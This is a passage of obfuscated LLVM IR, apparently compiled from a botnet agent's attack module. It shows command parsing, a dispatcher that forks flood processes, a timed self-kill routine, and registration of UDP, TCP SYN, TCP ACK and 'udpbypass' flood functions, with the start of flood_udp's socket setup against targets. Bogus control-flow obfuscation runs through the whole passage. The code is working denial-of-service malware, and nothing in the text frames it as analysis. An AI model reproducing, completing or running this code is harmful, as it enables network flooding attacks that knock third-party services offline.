  %251 = load i8*, i8** %3, align 8
  %252 = sext i32 %250 to i64
  %253 = getelementptr inbounds i8, i8* %251, i64 %252
  store i8* %253, i8** %3, align 8
  %254 = load i16, i16* %12, align 2
  %255 = zext i16 %254 to i32
  %256 = load i32, i32* %4, align 4
  %257 = sub nsw i32 %256, %255
  store i32 %257, i32* %4, align 4
  br label %258

; <label>:258:                                    ; preds = %196
  %259 = load i32, i32* %9, align 4
  %260 = add nsw i32 %259, 1
  store i32 %260, i32* %9, align 4
  br label %191

; <label>:261:                                    ; preds = %191
  %262 = load i8, i8* %5, align 1
  %263 = load %struct.option*, %struct.option** %7, align 8
  %264 = load i8, i8* %10, align 1
  %265 = load %struct.target*, %struct.target** %8, align 8
  %266 = load i8, i8* %6, align 1
  %267 = load i16, i16* %11, align 2
  call void @command_flood(i8 zeroext %262, %struct.option* %263, i8 zeroext %264, %struct.target* %265, i8 zeroext %266, i16 zeroext %267)
  br label %268

; <label>:268:                                    ; preds = %261, %187, %157, %46
  %269 = load i32, i32* @x.5
  %270 = load i32, i32* @y.6
  %271 = sub i32 %269, 1
  %272 = mul i32 %269, %271
  %273 = urem i32 %272, 2
  %274 = icmp eq i32 %273, 0
  %275 = icmp slt i32 %270, 10
  %276 = or i1 %274, %275
  br i1 %276, label %originalBB23, label %originalBB23alteredBB

originalBB23:                                     ; preds = %originalBB23alteredBB, %268
  %277 = load i32, i32* @x.5
  %278 = load i32, i32* @y.6
  %279 = sub i32 %277, 1
  %280 = mul i32 %277, %279
  %281 = urem i32 %280, 2
  %282 = icmp eq i32 %281, 0
  %283 = icmp slt i32 %278, 10
  %284 = or i1 %282, %283
  br i1 %284, label %originalBBpart225, label %originalBB23alteredBB

originalBBpart225:                                ; preds = %originalBB23
  ret void

originalBBalteredBB:                              ; preds = %originalBB, %47
  store i32 0, i32* %9, align 4
  br label %originalBB

originalBB1alteredBB:                             ; preds = %originalBB1, %69
  %285 = load i8*, i8** %3, align 8
  %286 = bitcast i8* %285 to i32*
  %287 = load i32, i32* %286, align 4
  %288 = load %struct.target*, %struct.target** %8, align 8
  %289 = load i32, i32* %9, align 4
  %290 = sext i32 %289 to i64
  %291 = getelementptr inbounds %struct.target, %struct.target* %288, i64 %290
  %292 = getelementptr inbounds %struct.target, %struct.target* %291, i32 0, i32 0
  store i32 %287, i32* %292, align 4
  %293 = load i8*, i8** %3, align 8
  %294 = getelementptr inbounds i8, i8* %293, i64 4
  store i8* %294, i8** %3, align 8
  %295 = load i32, i32* %4, align 4
  %296 = sext i32 %295 to i64
  %_ = sub i64 %296, 4
  %gen = mul i64 %_, 4
  %_2 = sub i64 %296, 4
  %gen3 = mul i64 %_2, 4
  %_4 = shl i64 %296, 4
  %_5 = sub i64 0, %296
  %gen6 = add i64 %_5, 4
  %_7 = shl i64 %296, 4
  %297 = sub i64 %296, 4
  %298 = trunc i64 %297 to i32
  store i32 %298, i32* %4, align 4
  %299 = load i8*, i8** %3, align 8
  %300 = bitcast i8* %299 to i16*
  %301 = load i16, i16* %300, align 2
  %302 = load %struct.target*, %struct.target** %8, align 8
  %303 = load i32, i32* %9, align 4
  %304 = sext i32 %303 to i64
  %305 = getelementptr inbounds %struct.target, %struct.target* %302, i64 %304
  %306 = getelementptr inbounds %struct.target, %struct.target* %305, i32 0, i32 1
  store i16 %301, i16* %306, align 4
  %307 = load %struct.target*, %struct.target** %8, align 8
  %308 = load i32, i32* %9, align 4
  %309 = sext i32 %308 to i64
  %310 = getelementptr inbounds %struct.target, %struct.target* %307, i64 %309
  %311 = getelementptr inbounds %struct.target, %struct.target* %310, i32 0, i32 1
  %312 = load i16, i16* %311, align 4
  %313 = call zeroext i16 @ntohs(i16 zeroext %312) #9
  %314 = load %struct.target*, %struct.target** %8, align 8
  %315 = load i32, i32* %9, align 4
  %316 = sext i32 %315 to i64
  %317 = getelementptr inbounds %struct.target, %struct.target* %314, i64 %316
  %318 = getelementptr inbounds %struct.target, %struct.target* %317, i32 0, i32 1
  store i16 %313, i16* %318, align 4
  %319 = load i8*, i8** %3, align 8
  %320 = getelementptr inbounds i8, i8* %319, i64 2
  store i8* %320, i8** %3, align 8
  %321 = load i32, i32* %4, align 4
  %322 = sext i32 %321 to i64
  %_8 = sub i64 0, %322
  %gen9 = add i64 %_8, 2
  %323 = sub i64 %322, 2
  %324 = trunc i64 %323 to i32
  store i32 %324, i32* %4, align 4
  br label %originalBB1

originalBB13alteredBB:                            ; preds = %originalBB13, %129
  %325 = load i8*, i8** %3, align 8
  %326 = load i8, i8* %325, align 1
  store i8 %326, i8* %10, align 1
  %327 = load i8*, i8** %3, align 8
  %328 = getelementptr inbounds i8, i8* %327, i64 1
  store i8* %328, i8** %3, align 8
  %329 = load i32, i32* %4, align 4
  %330 = sext i32 %329 to i64
  %_14 = sub i64 %330, 1
  %gen15 = mul i64 %_14, 1
  %331 = sub i64 %330, 1
  %332 = trunc i64 %331 to i32
  store i32 %332, i32* %4, align 4
  %333 = load i8, i8* %10, align 1
  %334 = zext i8 %333 to i32
  %335 = icmp eq i32 %334, 0
  br label %originalBB13

originalBB19alteredBB:                            ; preds = %originalBB19, %164
  %336 = load i8, i8* %10, align 1
  %337 = zext i8 %336 to i64
  %338 = call noalias i8* @calloc(i64 %337, i64 16) #8
  %339 = bitcast i8* %338 to %struct.option*
  store %struct.option* %339, %struct.option** %7, align 8
  %340 = load %struct.option*, %struct.option** %7, align 8
  %341 = icmp ne %struct.option* %340, null
  br label %originalBB19

originalBB23alteredBB:                            ; preds = %originalBB23, %268
  br label %originalBB23
}

; Function Attrs: nounwind readnone
declare zeroext i16 @ntohs(i16 zeroext) #3

; Function Attrs: nounwind
declare noalias i8* @calloc(i64, i64) #2

; Function Attrs: noinline nounwind uwtable
define internal void @command_flood(i8 zeroext, %struct.option*, i8 zeroext, %struct.target*, i8 zeroext, i16 zeroext) #0 {
  %7 = alloca i8, align 1
  %8 = alloca %struct.option*, align 8
  %9 = alloca i8, align 1
  %10 = alloca %struct.target*, align 8
  %11 = alloca i8, align 1
  %12 = alloca i16, align 2
  %13 = alloca i8* (...)*, align 8
  %14 = alloca i32, align 4
  %15 = alloca i32, align 4
  %16 = alloca %struct.arguments, align 8
  store i8 %0, i8* %7, align 1
  store %struct.option* %1, %struct.option** %8, align 8
  store i8 %2, i8* %9, align 1
  store %struct.target* %3, %struct.target** %10, align 8
  store i8 %4, i8* %11, align 1
  store i16 %5, i16* %12, align 2
  store i32 -1, i32* %14, align 4
  store i32 -1, i32* %15, align 4
  %17 = load i8, i8* %7, align 1
  %18 = call i8* (...)* @retrieve_command_func(i8 zeroext %17)
  store i8* (...)* %18, i8* (...)** %13, align 8
  %19 = load i8* (...)*, i8* (...)** %13, align 8
  %20 = icmp ne i8* (...)* %19, null
  br i1 %20, label %38, label %21

; <label>:21:                                     ; preds = %6
  %22 = load i32, i32* @x.7
  %23 = load i32, i32* @y.8
  %24 = sub i32 %22, 1
  %25 = mul i32 %22, %24
  %26 = urem i32 %25, 2
  %27 = icmp eq i32 %26, 0
  %28 = icmp slt i32 %23, 10
  %29 = or i1 %27, %28
  br i1 %29, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %21
  %30 = load i32, i32* @x.7
  %31 = load i32, i32* @y.8
  %32 = sub i32 %30, 1
  %33 = mul i32 %30, %32
  %34 = urem i32 %33, 2
  %35 = icmp eq i32 %34, 0
  %36 = icmp slt i32 %31, 10
  %37 = or i1 %35, %36
  br i1 %37, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br label %86

; <label>:38:                                     ; preds = %6
  %39 = load %struct.target*, %struct.target** %10, align 8
  %40 = getelementptr inbounds %struct.arguments, %struct.arguments* %16, i32 0, i32 0
  store %struct.target* %39, %struct.target** %40, align 8
  %41 = load i8, i8* %9, align 1
  %42 = getelementptr inbounds %struct.arguments, %struct.arguments* %16, i32 0, i32 2
  store i8 %41, i8* %42, align 8
  %43 = load i8, i8* %11, align 1
  %44 = getelementptr inbounds %struct.arguments, %struct.arguments* %16, i32 0, i32 3
  store i8 %43, i8* %44, align 1
  %45 = load %struct.option*, %struct.option** %8, align 8
  %46 = getelementptr inbounds %struct.arguments, %struct.arguments* %16, i32 0, i32 1
  store %struct.option* %45, %struct.option** %46, align 8
  %47 = load i16, i16* %12, align 2
  %48 = getelementptr inbounds %struct.arguments, %struct.arguments* %16, i32 0, i32 4
  store i16 %47, i16* %48, align 2
  %49 = call i32 @fork() #8
  store i32 %49, i32* %14, align 4
  %50 = load i32, i32* %14, align 4
  %51 = icmp eq i32 %50, -1
  br i1 %51, label %52, label %53

; <label>:52:                                     ; preds = %38
  br label %86

; <label>:53:                                     ; preds = %38
  %54 = load i32, i32* %14, align 4
  %55 = icmp ne i32 %54, 0
  br i1 %55, label %56, label %73

; <label>:56:                                     ; preds = %53
  %57 = load i32, i32* @x.7
  %58 = load i32, i32* @y.8
  %59 = sub i32 %57, 1
  %60 = mul i32 %57, %59
  %61 = urem i32 %60, 2
  %62 = icmp eq i32 %61, 0
  %63 = icmp slt i32 %58, 10
  %64 = or i1 %62, %63
  br i1 %64, label %originalBB1, label %originalBB1alteredBB

originalBB1:                                      ; preds = %originalBB1alteredBB, %56
  %65 = load i32, i32* @x.7
  %66 = load i32, i32* @y.8
  %67 = sub i32 %65, 1
  %68 = mul i32 %65, %67
  %69 = urem i32 %68, 2
  %70 = icmp eq i32 %69, 0
  %71 = icmp slt i32 %66, 10
  %72 = or i1 %70, %71
  br i1 %72, label %originalBBpart24, label %originalBB1alteredBB

originalBBpart24:                                 ; preds = %originalBB1
  br label %86

; <label>:73:                                     ; preds = %53
  %74 = call i32 @fork() #8
  store i32 %74, i32* %15, align 4
  %75 = load i32, i32* %15, align 4
  %76 = icmp eq i32 %75, -1
  br i1 %76, label %77, label %78

; <label>:77:                                     ; preds = %73
  call void @exit(i32 1) #10
  unreachable

; <label>:78:                                     ; preds = %73
  %79 = load i32, i32* %15, align 4
  %80 = icmp eq i32 %79, 0
  br i1 %80, label %81, label %82

; <label>:81:                                     ; preds = %78
  call void @terminate_command(%struct.arguments* %16)
  br label %82

; <label>:82:                                     ; preds = %81, %78
  %83 = load i8* (...)*, i8* (...)** %13, align 8
  %84 = bitcast i8* (...)* %83 to i8* (%struct.arguments*, ...)*
  %85 = call i8* (%struct.arguments*, ...) %84(%struct.arguments* %16)
  br label %86

; <label>:86:                                     ; preds = %82, %originalBBpart24, %52, %originalBBpart2
  ret void

originalBBalteredBB:                              ; preds = %originalBB, %21
  br label %originalBB

originalBB1alteredBB:                             ; preds = %originalBB1, %56
  br label %originalBB1
}

; Function Attrs: nounwind
declare void @free(i8*) #2

; Function Attrs: nounwind
declare noalias i8* @malloc(i64) #2

; Function Attrs: argmemonly nounwind
declare void @llvm.memcpy.p0i8.p0i8.i64(i8* nocapture writeonly, i8* nocapture readonly, i64, i32, i1) #4

; Function Attrs: noinline nounwind uwtable
define internal i8* (...)* @retrieve_command_func(i8 zeroext) #0 {
  %2 = alloca i8, align 1
  store i8 %0, i8* %2, align 1
  %3 = load i8, i8* %2, align 1
  %4 = zext i8 %3 to i64
  %5 = getelementptr inbounds [6 x %struct.command], [6 x %struct.command]* @command_list, i64 0, i64 %4
  %6 = getelementptr inbounds %struct.command, %struct.command* %5, i32 0, i32 1
  %7 = load i8* (...)*, i8* (...)** %6, align 8
  ret i8* (...)* %7
}

; Function Attrs: nounwind
declare i32 @fork() #2

; Function Attrs: noreturn nounwind
declare void @exit(i32) #5

; Function Attrs: noinline nounwind uwtable
define internal void @terminate_command(%struct.arguments*) #0 {
  %2 = alloca %struct.arguments*, align 8
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  store %struct.arguments* %0, %struct.arguments** %2, align 8
  store i32 -1, i32* %3, align 4
  store i32 0, i32* %4, align 4
  %5 = load %struct.arguments*, %struct.arguments** %2, align 8
  %6 = getelementptr inbounds %struct.arguments, %struct.arguments* %5, i32 0, i32 4
  %7 = load i16, i16* %6, align 2
  %8 = zext i16 %7 to i32
  %9 = call i32 @sleep(i32 %8)
  %10 = call i32 @getppid() #8
  store i32 %10, i32* %3, align 4
  %11 = load i32, i32* %3, align 4
  %12 = icmp sgt i32 %11, 1
  br i1 %12, label %13, label %16

; <label>:13:                                     ; preds = %1
  %14 = load i32, i32* %3, align 4
  %15 = call i32 @kill(i32 %14, i32 9) #8
  br label %16

; <label>:16:                                     ; preds = %13, %1
  %17 = load %struct.arguments*, %struct.arguments** %2, align 8
  %18 = getelementptr inbounds %struct.arguments, %struct.arguments* %17, i32 0, i32 0
  %19 = load %struct.target*, %struct.target** %18, align 8
  %20 = icmp ne %struct.target* %19, null
  br i1 %20, label %21, label %42

; <label>:21:                                     ; preds = %16
  %22 = load i32, i32* @x.11
  %23 = load i32, i32* @y.12
  %24 = sub i32 %22, 1
  %25 = mul i32 %22, %24
  %26 = urem i32 %25, 2
  %27 = icmp eq i32 %26, 0
  %28 = icmp slt i32 %23, 10
  %29 = or i1 %27, %28
  br i1 %29, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %21
  %30 = load %struct.arguments*, %struct.arguments** %2, align 8
  %31 = getelementptr inbounds %struct.arguments, %struct.arguments* %30, i32 0, i32 0
  %32 = load %struct.target*, %struct.target** %31, align 8
  %33 = bitcast %struct.target* %32 to i8*
  call void @free(i8* %33) #8
  %34 = load i32, i32* @x.11
  %35 = load i32, i32* @y.12
  %36 = sub i32 %34, 1
  %37 = mul i32 %34, %36
  %38 = urem i32 %37, 2
  %39 = icmp eq i32 %38, 0
  %40 = icmp slt i32 %35, 10
  %41 = or i1 %39, %40
  br i1 %41, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br label %42

; <label>:42:                                     ; preds = %originalBBpart2, %16
  %43 = load %struct.arguments*, %struct.arguments** %2, align 8
  %44 = getelementptr inbounds %struct.arguments, %struct.arguments* %43, i32 0, i32 1
  %45 = load %struct.option*, %struct.option** %44, align 8
  %46 = icmp ne %struct.option* %45, null
  br i1 %46, label %64, label %47

; <label>:47:                                     ; preds = %42
  %48 = load i32, i32* @x.11
  %49 = load i32, i32* @y.12
  %50 = sub i32 %48, 1
  %51 = mul i32 %48, %50
  %52 = urem i32 %51, 2
  %53 = icmp eq i32 %52, 0
  %54 = icmp slt i32 %49, 10
  %55 = or i1 %53, %54
  br i1 %55, label %originalBB1, label %originalBB1alteredBB

originalBB1:                                      ; preds = %originalBB1alteredBB, %47
  call void @exit(i32 0) #10
  %56 = load i32, i32* @x.11
  %57 = load i32, i32* @y.12
  %58 = sub i32 %56, 1
  %59 = mul i32 %56, %58
  %60 = urem i32 %59, 2
  %61 = icmp eq i32 %60, 0
  %62 = icmp slt i32 %57, 10
  %63 = or i1 %61, %62
  br i1 %63, label %originalBBpart24, label %originalBB1alteredBB

originalBBpart24:                                 ; preds = %originalBB1
  unreachable

; <label>:64:                                     ; preds = %42
  store i32 0, i32* %4, align 4
  br label %65

; <label>:65:                                     ; preds = %81, %64
  %66 = load i32, i32* %4, align 4
  %67 = load %struct.arguments*, %struct.arguments** %2, align 8
  %68 = getelementptr inbounds %struct.arguments, %struct.arguments* %67, i32 0, i32 2
  %69 = load i8, i8* %68, align 8
  %70 = zext i8 %69 to i32
  %71 = icmp slt i32 %66, %70
  br i1 %71, label %72, label %84

; <label>:72:                                     ; preds = %65
  %73 = load %struct.arguments*, %struct.arguments** %2, align 8
  %74 = getelementptr inbounds %struct.arguments, %struct.arguments* %73, i32 0, i32 1
  %75 = load %struct.option*, %struct.option** %74, align 8
  %76 = load i32, i32* %4, align 4
  %77 = sext i32 %76 to i64
  %78 = getelementptr inbounds %struct.option, %struct.option* %75, i64 %77
  %79 = getelementptr inbounds %struct.option, %struct.option* %78, i32 0, i32 2
  %80 = load i8*, i8** %79, align 8
  call void @free(i8* %80) #8
  br label %81

; <label>:81:                                     ; preds = %72
  %82 = load i32, i32* %4, align 4
  %83 = add nsw i32 %82, 1
  store i32 %83, i32* %4, align 4
  br label %65

; <label>:84:                                     ; preds = %65
  %85 = load %struct.arguments*, %struct.arguments** %2, align 8
  %86 = getelementptr inbounds %struct.arguments, %struct.arguments* %85, i32 0, i32 1
  %87 = load %struct.option*, %struct.option** %86, align 8
  %88 = bitcast %struct.option* %87 to i8*
  call void @free(i8* %88) #8
  call void @exit(i32 0) #10
  unreachable
                                                  ; No predecessors!
  ret void

originalBBalteredBB:                              ; preds = %originalBB, %21
  %90 = load %struct.arguments*, %struct.arguments** %2, align 8
  %91 = getelementptr inbounds %struct.arguments, %struct.arguments* %90, i32 0, i32 0
  %92 = load %struct.target*, %struct.target** %91, align 8
  %93 = bitcast %struct.target* %92 to i8*
  call void @free(i8* %93) #8
  br label %originalBB

originalBB1alteredBB:                             ; preds = %originalBB1, %47
  call void @exit(i32 0) #10
  br label %originalBB1
}

declare i32 @sleep(i32) #6

; Function Attrs: nounwind
declare i32 @getppid() #2

; Function Attrs: nounwind
declare i32 @kill(i32, i32) #2

; Function Attrs: noinline nounwind uwtable
define void @init_commands() #0 {
  call void @load_command(i8 zeroext 1, i8* (...)* bitcast (void (%struct.arguments*)* @flood_udp to i8* (...)*))
  call void @load_command(i8 zeroext 3, i8* (...)* bitcast (void (%struct.arguments*)* @flood_tcp_syn to i8* (...)*))
  call void @load_command(i8 zeroext 2, i8* (...)* bitcast (void (%struct.arguments*)* @flood_tcp_ack to i8* (...)*))
  call void @load_command(i8 zeroext 7, i8* (...)* bitcast (void (%struct.arguments*)* @flood_tcp_ack_connect to i8* (...)*))
  call void @load_command(i8 zeroext 20, i8* (...)* bitcast (void (%struct.arguments*)* @flood_udpbypass to i8* (...)*))
  ret void
}

; Function Attrs: noinline nounwind uwtable
define internal void @load_command(i8 zeroext, i8* (...)*) #0 {
  %3 = load i32, i32* @x.15
  %4 = load i32, i32* @y.16
  %5 = sub i32 %3, 1
  %6 = mul i32 %3, %5
  %7 = urem i32 %6, 2
  %8 = icmp eq i32 %7, 0
  %9 = icmp slt i32 %4, 10
  %10 = or i1 %8, %9
  br i1 %10, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %2
  %11 = alloca i8, align 1
  %12 = alloca i8* (...)*, align 8
  store i8 %0, i8* %11, align 1
  store i8* (...)* %1, i8* (...)** %12, align 8
  %13 = load i8, i8* %11, align 1
  %14 = load i8, i8* %11, align 1
  %15 = zext i8 %14 to i64
  %16 = getelementptr inbounds [6 x %struct.command], [6 x %struct.command]* @command_list, i64 0, i64 %15
  %17 = getelementptr inbounds %struct.command, %struct.command* %16, i32 0, i32 0
  store i8 %13, i8* %17, align 16
  %18 = load i8* (...)*, i8* (...)** %12, align 8
  %19 = load i8, i8* %11, align 1
  %20 = zext i8 %19 to i64
  %21 = getelementptr inbounds [6 x %struct.command], [6 x %struct.command]* @command_list, i64 0, i64 %20
  %22 = getelementptr inbounds %struct.command, %struct.command* %21, i32 0, i32 1
  store i8* (...)* %18, i8* (...)** %22, align 8
  %23 = load i32, i32* @x.15
  %24 = load i32, i32* @y.16
  %25 = sub i32 %23, 1
  %26 = mul i32 %23, %25
  %27 = urem i32 %26, 2
  %28 = icmp eq i32 %27, 0
  %29 = icmp slt i32 %24, 10
  %30 = or i1 %28, %29
  br i1 %30, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  ret void

originalBBalteredBB:                              ; preds = %originalBB, %2
  %31 = alloca i8, align 1
  %32 = alloca i8* (...)*, align 8
  store i8 %0, i8* %31, align 1
  store i8* (...)* %1, i8* (...)** %32, align 8
  %33 = load i8, i8* %31, align 1
  %34 = load i8, i8* %31, align 1
  %35 = zext i8 %34 to i64
  %36 = getelementptr inbounds [6 x %struct.command], [6 x %struct.command]* @command_list, i64 0, i64 %35
  %37 = getelementptr inbounds %struct.command, %struct.command* %36, i32 0, i32 0
  store i8 %33, i8* %37, align 16
  %38 = load i8* (...)*, i8* (...)** %32, align 8
  %39 = load i8, i8* %31, align 1
  %40 = zext i8 %39 to i64
  %41 = getelementptr inbounds [6 x %struct.command], [6 x %struct.command]* @command_list, i64 0, i64 %40
  %42 = getelementptr inbounds %struct.command, %struct.command* %41, i32 0, i32 1
  store i8* (...)* %38, i8* (...)** %42, align 8
  br label %originalBB
}

; Function Attrs: noinline nounwind uwtable
define void @flood_udp(%struct.arguments*) #0 {
  %2 = alloca %struct.arguments*, align 8
  %3 = alloca i16, align 2
  %4 = alloca i16, align 2
  %5 = alloca i32, align 4
  %6 = alloca i8**, align 8
  %7 = alloca i32*, align 8
  %8 = alloca %struct.sockaddr_in, align 4
  %9 = alloca %struct.sockaddr_in, align 4
  %10 = alloca %union.__CONST_SOCKADDR_ARG, align 8
  %11 = alloca %union.__CONST_SOCKADDR_ARG, align 8
  store %struct.arguments* %0, %struct.arguments** %2, align 8
  store i16 0, i16* %3, align 2
  store i16 0, i16* %4, align 2
  store i32 0, i32* %5, align 4
  %12 = load %struct.arguments*, %struct.arguments** %2, align 8
  %13 = getelementptr inbounds %struct.arguments, %struct.arguments* %12, i32 0, i32 1
  %14 = load %struct.option*, %struct.option** %13, align 8
  %15 = load %struct.arguments*, %struct.arguments** %2, align 8
  %16 = getelementptr inbounds %struct.arguments, %struct.arguments* %15, i32 0, i32 2
  %17 = load i8, i8* %16, align 8
  %18 = call zeroext i16 @retrieve_opt_num(%struct.option* %14, i8 zeroext %17, i8 zeroext 2, i16 zeroext 900)
  store i16 %18, i16* %3, align 2
  %19 = load %struct.arguments*, %struct.arguments** %2, align 8
  %20 = getelementptr inbounds %struct.arguments, %struct.arguments* %19, i32 0, i32 1
  %21 = load %struct.option*, %struct.option** %20, align 8
  %22 = load %struct.arguments*, %struct.arguments** %2, align 8
  %23 = getelementptr inbounds %struct.arguments, %struct.arguments* %22, i32 0, i32 2
  %24 = load i8, i8* %23, align 8
  %25 = call zeroext i16 @retrieve_opt_num(%struct.option* %21, i8 zeroext %24, i8 zeroext 1, i16 zeroext -1)
  store i16 %25, i16* %4, align 2
  %26 = load %struct.arguments*, %struct.arguments** %2, align 8
  %27 = getelementptr inbounds %struct.arguments, %struct.arguments* %26, i32 0, i32 3
  %28 = load i8, i8* %27, align 1
  %29 = zext i8 %28 to i64
  %30 = call noalias i8* @calloc(i64 %29, i64 8) #8
  %31 = bitcast i8* %30 to i8**
  store i8** %31, i8*** %6, align 8
  %32 = load i8**, i8*** %6, align 8
  %33 = icmp ne i8** %32, null
  br i1 %33, label %35, label %34

; <label>:34:                                     ; preds = %1
  call void @exit(i32 1) #10
  unreachable

; <label>:35:                                     ; preds = %1
  %36 = load %struct.arguments*, %struct.arguments** %2, align 8
  %37 = getelementptr inbounds %struct.arguments, %struct.arguments* %36, i32 0, i32 3
  %38 = load i8, i8* %37, align 1
  %39 = zext i8 %38 to i64
  %40 = call noalias i8* @calloc(i64 %39, i64 4) #8
  %41 = bitcast i8* %40 to i32*
  store i32* %41, i32** %7, align 8
  %42 = load i32*, i32** %7, align 8
  %43 = icmp ne i32* %42, null
  br i1 %43, label %45, label %44

; <label>:44:                                     ; preds = %35
  call void @exit(i32 1) #10
  unreachable

; <label>:45:                                     ; preds = %35
  store i32 0, i32* %5, align 4
  br label %46

; <label>:46:                                     ; preds = %originalBBpart225, %45
  %47 = load i32, i32* %5, align 4
  %48 = load %struct.arguments*, %struct.arguments** %2, align 8
  %49 = getelementptr inbounds %struct.arguments, %struct.arguments* %48, i32 0, i32 3
  %50 = load i8, i8* %49, align 1
  %51 = zext i8 %50 to i32
  %52 = icmp slt i32 %47, %51
  br i1 %52, label %53, label %218

; <label>:53:                                     ; preds = %46
  %54 = call i32 @socket(i32 2, i32 2, i32 0) #8
  %55 = load i32*, i32** %7, align 8
  %56 = load i32, i32* %5, align 4
  %57 = sext i32 %56 to i64
  %58 = getelementptr inbounds i32, i32* %55, i64 %57
  store i32 %54, i32* %58, align 4
  %59 = load i32*, i32** %7, align 8
  %60 = load i32, i32* %5, align 4
  %61 = sext i32 %60 to i64
  %62 = getelementptr inbounds i32, i32* %59, i64 %61
  %63 = load i32, i32* %62, align 4
  %64 = icmp eq i32 %63, -1
  br i1 %64, label %65, label %66

; <label>:65:                                     ; preds = %53
  call void @exit(i32 1) #10
  unreachable

; <label>:66:                                     ; preds = %53
  %67 = load i32, i32* @x.17
  %68 = load i32, i32* @y.18
  %69 = sub i32 %67, 1
  %70 = mul i32 %67, %69
  %71 = urem i32 %70, 2
  %72 = icmp eq i32 %71, 0
  %73 = icmp slt i32 %68, 10
  %74 = or i1 %72, %73
  br i1 %74, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %66
  %75 = load i16, i16* %3, align 2
  %76 = zext i16 %75 to i32
  %77 = add nsw i32 %76, 1
  %78 = sext i32 %77 to i64
  %79 = call noalias i8* @malloc(i64 %78) #8
  %80 = load i8**, i8*** %6, align 8
  %81 = load i32, i32* %5, align 4
  %82 = sext i32 %81 to i64
  %83 = getelementptr inbounds i8*, i8** %80, i64 %82
  store i8* %79, i8** %83, align 8
  %84 = load i8**, i8*** %6, align 8
  %85 = load i32, i32* %5, align 4
  %86 = sext i32 %85 to i64
  %87 = getelementptr inbounds i8*, i8** %84, i64 %86
  %88 = load i8*, i8** %87, align 8
  %89 = icmp ne i8* %88, null
  %90 = load i32, i32* @x.17
  %91 = load i32, i32* @y.18
  %92 = sub i32 %90, 1
  %93 = mul i32 %90, %92
  %94 = urem i32 %93, 2
  %95 = icmp eq i32 %94, 0
  %96 = icmp slt i32 %91, 10
  %97 = or i1 %95, %96
  br i1 %97, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br i1 %89, label %115, label %98

; <label>:98:                                     ; preds = %originalBBpart2
  %99 = load i32, i32* @x.17
  %100 = load i32, i32* @y.18
  %101 = sub i32 %99, 1
  %102 = mul i32 %99, %101
  %103 = urem i32 %102, 2
  %104 = icmp eq i32 %103, 0
  %105 = icmp slt i32 %100, 10
  %106 = or i1 %104, %105
  br i1 %106, label %originalBB7, label %originalBB7alteredBB

originalBB7:                                      ; preds = %originalBB7alteredBB, %98
  call void @exit(i32 1) #10
  %107 = load i32, i32* @x.17
  %108 = load i32, i32* @y.18
  %109 = sub i32 %107, 1
  %110 = mul i32 %107, %109
  %111 = urem i32 %110, 2
  %112 = icmp eq i32 %111, 0
  %113 = icmp slt i32 %108, 10
  %114 = or i1 %112, %113
  br i1 %114, label %originalBBpart29, label %originalBB7alteredBB

originalBBpart29:                                 ; preds = %originalBB7
  unreachable

; <label>:115:                                    ; preds = %originalBBpart2
  %116 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %8, i32 0, i32 0
  store i16 2, i16* %116, align 4
  %117 = call i32 @rand_new()
  %118 = trunc i32 %117 to i16
  %119 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %8, i32 0, i32 1
  store i16 %118, i16* %119, align 2
  %120 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %8, i32 0, i32 2
  %121 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %120, i32 0, i32 0
  store i32 0, i32* %121, align 4
  %122 = load i32*, i32** %7, align 8
  %123 = load i32, i32* %5, align 4
  %124 = sext i32 %123 to i64
  %125 = getelementptr inbounds i32, i32* %122, i64 %124
  %126 = load i32, i32* %125, align 4
  %127 = bitcast %union.__CONST_SOCKADDR_ARG* %10 to %struct.sockaddr**
  %128 = bitcast %struct.sockaddr_in* %8 to %struct.sockaddr*
  store %struct.sockaddr* %128, %struct.sockaddr** %127, align 8
  %129 = getelementptr inbounds %union.__CONST_SOCKADDR_ARG, %union.__CONST_SOCKADDR_ARG* %10, i32 0, i32 0
  %130 = load %struct.sockaddr*, %struct.sockaddr** %129, align 8
  %131 = call i32 @bind(i32 %126, %struct.sockaddr* %130, i32 16) #8
  %132 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %9, i32 0, i32 0
  store i16 2, i16* %132, align 4
  %133 = load i16, i16* %4, align 2
  %134 = call zeroext i16 @htons(i16 zeroext %133) #9
  %135 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %9, i32 0, i32 1
  store i16 %134, i16* %135, align 2
  %136 = load %struct.arguments*, %struct.arguments** %2, align 8
  %137 = getelementptr inbounds %struct.arguments, %struct.arguments* %136, i32 0, i32 0
  %138 = load %struct.target*, %struct.target** %137, align 8
  %139 = load i32, i32* %5, align 4
  %140 = sext i32 %139 to i64
  %141 = getelementptr inbounds %struct.target, %struct.target* %138, i64 %140
  %142 = getelementptr inbounds %struct.target, %struct.target* %141, i32 0, i32 1
  %143 = load i16, i16* %142, align 4
  %144 = zext i16 %143 to i32
  %145 = icmp slt i32 %144, 32
  br i1 %145, label %146, label %169

; <label>:146:                                    ; preds = %115
  %147 = load %struct.arguments*, %struct.arguments** %2, align 8
  %148 = getelementptr inbounds %struct.arguments, %struct.arguments* %147, i32 0, i32 0
  %149 = load %struct.target*, %struct.target** %148, align 8
  %150 = load i32, i32* %5, align 4
  %151 = sext i32 %150 to i64
  %152 = getelementptr inbounds %struct.target, %struct.target* %149, i64 %151
  %153 = getelementptr inbounds %struct.target, %struct.target* %152, i32 0, i32 0
  %154 = load i32, i32* %153, align 4
  %155 = call i32 @ntohl(i32 %154) #9
  %156 = call i32 @rand_new()
  %157 = load %struct.arguments*, %struct.arguments** %2, align 8
  %158 = getelementptr inbounds %struct.arguments, %struct.arguments* %157, i32 0, i32 0
  %159 = load %struct.target*, %struct.target** %158, align 8
  %160 = load i32, i32* %5, align 4
  %161 = sext i32 %160 to i64
